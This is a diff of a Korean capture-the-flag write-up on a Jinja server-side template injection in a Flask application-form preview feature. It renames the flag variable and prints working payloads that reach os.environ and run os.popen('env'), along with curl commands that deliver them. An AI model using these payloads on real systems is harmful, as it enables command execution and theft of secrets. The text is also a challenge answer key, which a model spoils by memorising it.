@@ -13,7 +13,7 @@
 | 접속 | `http://<출제조IP>:8006` |
 | 인증 | 회원가입 후 로그인 (미리보기는 로그인 필요) |
 | 플래그 형식 | `GlassHouse{...}` |
-| 최종 목표 | 신청서 **미리보기** 기능의 SSTI를 이용해, 파일이 아닌 **환경변수(`FLAG_SSTI`)** 에 담긴 플래그를 읽어낸다 |
+| 최종 목표 | 신청서 **미리보기** 기능의 SSTI를 이용해, 파일이 아닌 **환경변수(`FLAG_MIRROR`)** 에 담긴 플래그를 읽어낸다 |
 
 신청 사연의 줄바꿈이 깨진다는 민원 때문에, 사무국이 신청서 작성 화면에 **미리보기** 버튼을 달았다. 제출 전에 내 사연이 어떻게 보일지 바로 확인해 준다. 그런데 이 "바로 보여주는" 방식에 문제가 있다. 또한 설명에 따르면 중요한 값은 파일로 남기지 않고 서버가 켜질 때만 건네받아 쓴다 — 즉 플래그는 **환경변수**에 들어 있다.
 
@@ -27,7 +27,7 @@
 
 3. **무엇을 읽을지 정한다.** 문제 설명의 "중요한 값을 파일로 안 남기고 서버 켤 때만 건네받는다" 는 플래그가 **환경변수**에 있다는 단서다. (그래서 Flask 설정을 덤프하는 `{{ config }}` 로는 안 나온다 — 이 앱은 플래그를 `app.config` 에 넣지 않는다. 오직 프로세스 환경에만 있다.)
 
-4. **환경변수까지 손을 뻗는다.** Jinja 표현식 안에서는 파이썬 객체를 타고 `os` 모듈에 닿을 수 있다. 템플릿 전역에 늘 존재하는 `lipsum` 을 징검다리 삼아 `lipsum.__globals__.os.environ` 으로 환경변수에 접근하고, 거기서 `FLAG_SSTI` 를 꺼낸다.
+4. **환경변수까지 손을 뻗는다.** Jinja 표현식 안에서는 파이썬 객체를 타고 `os` 모듈에 닿을 수 있다. 템플릿 전역에 늘 존재하는 `lipsum` 을 징검다리 삼아 `lipsum.__globals__.os.environ` 으로 환경변수에 접근하고, 거기서 `FLAG_MIRROR` 를 꺼낸다.
 
 ---
 
@@ -67,7 +67,7 @@ Jinja 표현식은 단순 계산(`{{7*7}}`)에 그치지 않는다. 파이썬 �
 - 사용자 입력(`intro`)이 **템플릿 "소스" 문자열에 결합**된다(문자열 `+`).
 - 그 문자열을 **`render_template_string` 으로 렌더**한다 — 즉 입력이 코드로 평가된다.
 - 미리보기는 **로그인만 하면** 쓸 수 있고(회원가입으로 계정 생성 가능), 특별한 권한이 필요 없다.
-- 플래그가 **환경변수**(`FLAG_SSTI`)에 있어, 표현식으로 `os.environ` 에 닿으면 바로 읽힌다.
+- 플래그가 **환경변수**(`FLAG_MIRROR`)에 있어, 표현식으로 `os.environ` 에 닿으면 바로 읽힌다.
 
 ---
 
@@ -78,7 +78,7 @@ Jinja 표현식은 단순 계산(`{{7*7}}`)에 그치지 않는다. 파이썬 �
 | 입력(사연 칸) | 미리보기 출력 | 의미 |
 |---|---|---|
 | `{{ 7*7 }}` | `49` | SSTI 성립 확인 |
-| `{{ lipsum.__globals__.os.environ['FLAG_SSTI'] }}` | `GlassHouse{...}` | 환경변수의 플래그 노출 |
+| `{{ lipsum.__globals__.os.environ['FLAG_MIRROR'] }}` | `GlassHouse{...}` | 환경변수의 플래그 노출 |
 
 최종 출력은 다음 형태가 된다. (대괄호 안은 서버 실행 시의 실제 값)
 
@@ -86,7 +86,7 @@ Jinja 표현식은 단순 계산(`{{7*7}}`)에 그치지 않는다. 파이썬 �
 GlassHouse{[실제 플래그 값]}
 ```
 
-> 변수 이름을 모를 때는 `{{ lipsum.__globals__.os.environ }}` 로 **환경변수 전체를 덤프**하면 그 안에서 `FLAG_SSTI=GlassHouse{...}` 를 찾을 수 있다. 명령 실행으로 접근하려면 `{{ lipsum.__globals__.os.popen('env').read() }}` 도 같은 결과를 준다.
+> 변수 이름을 모를 때는 `{{ lipsum.__globals__.os.environ }}` 로 **환경변수 전체를 덤프**하면 그 안에서 `FLAG_MIRROR=GlassHouse{...}` 를 찾을 수 있다. 명령 실행으로 접근하려면 `{{ lipsum.__globals__.os.popen('env').read() }}` 도 같은 결과를 준다.
 
 ---
 
@@ -151,7 +151,7 @@ def preview():
 | 목적 | 사연 칸에 넣을 값 |
 |---|---|
 | SSTI 확인 | `{{ 7*7 }}` → 미리보기에 `49` |
-| 플래그 획득 | `{{ lipsum.__globals__.os.environ['FLAG_SSTI'] }}` → 미리보기에 플래그 |
+| 플래그 획득 | `{{ lipsum.__globals__.os.environ['FLAG_MIRROR'] }}` → 미리보기에 플래그 |
 
 ### CLI로 재현 (선택)
 
@@ -169,6 +169,6 @@ curl -s -c c.txt --data-urlencode "username=hacker01" \
 
 # 2) 미리보기에 SSTI 페이로드 전송 → 플래그 추출
 curl -s -b c.txt \
-     --data-urlencode "intro={{ lipsum.__globals__.os.environ['FLAG_SSTI'] }}" \
+     --data-urlencode "intro={{ lipsum.__globals__.os.environ['FLAG_MIRROR'] }}" \
      "$B/apply/preview" | grep -o "GlassHouse{[^}]*}"
 ```
